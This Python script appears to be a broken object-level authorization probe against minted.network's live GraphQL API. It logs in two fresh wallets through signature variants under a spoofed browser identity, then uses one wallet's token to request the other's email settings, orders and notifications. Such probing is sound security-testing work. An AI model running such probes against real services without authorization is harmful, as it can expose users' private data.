#!/usr/bin/env python3
"""minted.network login variant matrix -> then BOLA test."""
import json, time
import requests
from eth_account import Account
from eth_account.messages import encode_defunct
from eth_utils import to_checksum_address

API = "https://api.minted.network/graphql"
MSG_TMPL = (
    "Welcome to Minted!\n\n"
    "Please sign to let us verify that you are the owner of this address: {addr}\n\n"
    "By signing you confirm that you accept the following:\n\n"
    "Minted Terms and Conditions: https://minted.network/about/termsandconditions.pdf\n"
    "Minted Code of Conduct: https://minted.network/about/codeofconduct.pdf\n\n"
    "and acknowledge that you have read our Minted Privacy Notice: https://minted.network/about/privacynotice.pdf\n\n"
    "This request and signature will not trigger a blockchain transaction nor cost any gas fees.\n"
    "The electronic hash record will be stored in our databases as a record of your agreement.\n\n"
    "Your authentication status will reset after 24 hours.\n"
    "timestamp: {ts}"
)
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
LOGIN_Q = """mutation login($timestamp: Long!, $evmAddress: EvmAddress!, $signature: String!) {
  login(input: {timestamp: $timestamp, evmAddress: $evmAddress, signature: $signature}) {
    token
    evmAddress
  }
}"""

def gql(query, variables=None, token=None):
    h = {"Content-Type": "application/json", "User-Agent": UA,
         "Origin": "https://minted.network", "Referer": "https://minted.network/"}
    if token:
        h["Authorization"] = f"Bearer {token}"
    r = requests.post(API, json={"query": query, "variables": variables or {}},
                      headers=h, timeout=30)
    try:
        return r.status_code, r.json()
    except Exception:
        return r.status_code, {"raw": r.text[:300]}

def sign(acct, msg):
    return acct.sign_message(encode_defunct(text=msg)).signature.hex()

def login_variants(key):
    acct = Account.from_key(key)
    cs = to_checksum_address(acct.address)
    low = acct.address.lower()
    now = int(time.time())
    results = []
    # variants: (addr_in_var, ts_value, addr_in_msg)
    for name, av, ts, mv in [
        ("cs+ms",   cs,  now*1000, cs.lower()),
        ("cs+sec",  cs,  now,      cs.lower()),
        ("low+ms",  low, now*1000, low),
        ("cs+ms+msgCS", cs, now*1000, cs),
        ("cs+sec+msgCS", cs, now, cs),
    ]:
        msg = MSG_TMPL.format(addr=mv, ts=ts)
        sc, out = gql(LOGIN_Q, {"timestamp": ts, "evmAddress": av,
                                "signature": sign(acct, msg)})
        err = ((out.get("errors") or [{}])[0].get("message"))
        tok = ((out.get("data") or {}).get("login") or {}).get("token")
        results.append((name, err, tok))
        print(f"VARIANT {name}: HTTP {sc} err={err} token={'YES' if tok else 'no'}", flush=True)
        if tok:
            return cs, tok
    return cs, None

Q_PRIV = """query getUserPrivateSetting($address: EvmAddress!) {
  user(address: $address) {
    evmAddress
    privateSetting { email emailVerified offerReceived }
  }
}"""
Q_ORDERS = """query getUserOrders($address: EvmAddress!, $first: Int!) {
  user(address: $address) {
    evmAddress
    orders(first: $first) { totalCount }
  }
}"""
Q_NOTIF = """query getUserNotifications($address: EvmAddress!, $first: Int!) {
  user(address: $address) {
    evmAddress
    notifications { userAddress totalUnreadCount notificationConnection(first: $first) { totalCount } }
  }
}"""

def show(tag, resp):
    print(f"### {tag}\n{json.dumps(resp)[:800]}\n", flush=True)

def main():
    ka = Account.create().key.hex(); kb = Account.create().key.hex()
    ca, ta = login_variants(ka)
    cb, tb = login_variants(kb)
    print(f"WALLET_A={ca} tokenA={'YES' if ta else 'NO'}", flush=True)
    print(f"WALLET_B={cb} tokenB={'YES' if tb else 'NO'}", flush=True)
    if not ta:
        print("LOGIN STILL FAILED - cannot run BOLA tests", flush=True); return
    show("BASELINE A-token -> privateSetting(A)", gql(Q_PRIV, {"address": ca}, ta)[1])
    show("BOLA TEST A-token -> privateSetting(B)", gql(Q_PRIV, {"address": cb}, ta)[1])
    show("BOLA TEST A-token -> orders(B)", gql(Q_ORDERS, {"address": cb, "first": 5}, ta)[1])
    show("BOLA TEST A-token -> notifications(B)", gql(Q_NOTIF, {"address": cb, "first": 5}, ta)[1])
    show("NO-TOKEN -> privateSetting(B)", gql(Q_PRIV, {"address": cb})[1])

if __name__ == "__main__":
    main()
